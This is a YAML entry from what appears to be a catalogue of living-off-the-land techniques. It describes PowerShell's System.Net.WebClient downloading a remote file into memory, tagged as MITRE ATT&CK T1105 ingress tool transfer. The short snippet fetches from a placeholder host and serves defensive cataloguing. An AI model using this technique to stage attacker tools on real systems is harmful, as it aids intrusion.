---
Name: System.Net.WebClient
Description: System.Net.WebClient is a .Net Class which can be used to download and upload data
Author: 'Hegusung'
Created: 2024-10-23
Categories:
  - Category: Download
    Description: System.Net.WebClient - Download
    Usecase: System.Net.WebClient can download a file from a remote server
    Code: |
      # (Powershell) Using WebClient to download to a buffer
      $webclient = New-Object System.Net.WebClient
      $buffer = $webclient.DownloadData("https://example.com/file.zip")
    MitreID: T1105
    OperatingSystem: Windows XP, Windows 7, Windows 8, Windows 10, Windows 11
    Code_Sample:
    Tags:
      - Origin: .NetEXE
      - Origin: .NetDLL
      - Origin: Powershell
Detection:
Resources:
Acknowledgement:
  - Person: Hegusung
    Handle: '@hegusung'
---
